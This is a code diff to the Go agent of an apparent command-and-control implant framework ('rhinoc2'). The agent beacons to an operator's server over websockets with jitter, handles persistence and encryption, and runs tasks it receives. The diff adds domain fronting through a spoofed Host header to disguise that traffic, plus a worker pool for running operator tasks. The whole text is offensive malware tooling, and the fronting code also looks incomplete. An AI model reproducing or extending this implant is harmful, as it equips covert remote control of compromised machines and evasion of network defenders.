@@ -9,6 +9,8 @@ import (
 	"io/ioutil"
 	"log"
 	"math/rand"
+	"net/http"
+	"net/url"
 	"os"
 	"os/exec"
 	"rhinoc2/pkg/commands"
@@ -26,9 +28,10 @@ import (
 )
 
 type Config struct {
-	ServerURL string
-	Key       string
-	Interval  time.Duration
+	ServerURL   string
+	Key         string
+	Interval    time.Duration
+	DomainFront string
 }
 
 type Agent struct {
@@ -77,7 +80,7 @@ func validateTask(task map[string]interface{}) bool {
 
 func newAgent(config Config) *Agent {
 	ph, _ := persistence.NewPersistenceHandler()
-	return &Agent{
+	a := &Agent{
 		id:             generateID(),
 		config:         config,
 		crypto:         crypto.NewCryptoHandler(config.Key),
@@ -91,6 +94,32 @@ func newAgent(config Config) *Agent {
 		maxActiveTasks: 5,
 		activeTasks:    0,
 	}
+	a.startWorkers()
+	return a
+}
+
+func (a *Agent) startWorkers() {
+	for i := 0; i < a.maxActiveTasks; i++ {
+		go func() {
+			for task := range a.taskQueue {
+				a.processTask(task)
+			}
+		}()
+	}
+}
+
+func (a *Agent) processTask(task map[string]interface{}) {
+	a.taskMu.Lock()
+	a.activeTasks++
+	a.taskMu.Unlock()
+
+	defer func() {
+		a.taskMu.Lock()
+		a.activeTasks--
+		a.taskMu.Unlock()
+	}()
+
+	a.handleTask(task)
 }
 
 func (a *Agent) checkin() error {
@@ -461,7 +490,21 @@ func (a *Agent) run() {
 	rand.Seed(time.Now().UnixNano())
 
 	for {
-		conn, _, err := websocket.DefaultDialer.Dial(a.config.ServerURL, nil)
+		var conn *websocket.Conn
+		var err error
+
+		if a.config.DomainFront != "" {
+			parsedURL, _ := url.Parse(a.config.ServerURL)
+			headers := http.Header{}
+			headers.Set("Host", a.config.DomainFront)
+			dialer := websocket.Dialer{
+				TLSClientConfig: nil,
+			}
+			conn, _, err = dialer.Dial(parsedURL.String(), headers)
+		} else {
+			conn, _, err = websocket.DefaultDialer.Dial(a.config.ServerURL, nil)
+		}
+
 		if err != nil {
 			jitter := time.Duration(rand.Int63n(int64(a.config.Interval / 2)))
 			time.Sleep(a.config.Interval + jitter)
@@ -532,7 +575,11 @@ func (a *Agent) run() {
 				continue
 			}
 
-			go a.handleTask(task)
+			select {
+			case a.taskQueue <- task:
+			default:
+				log.Printf("Task queue full, dropping task")
+			}
 		}
 
 		cancel()
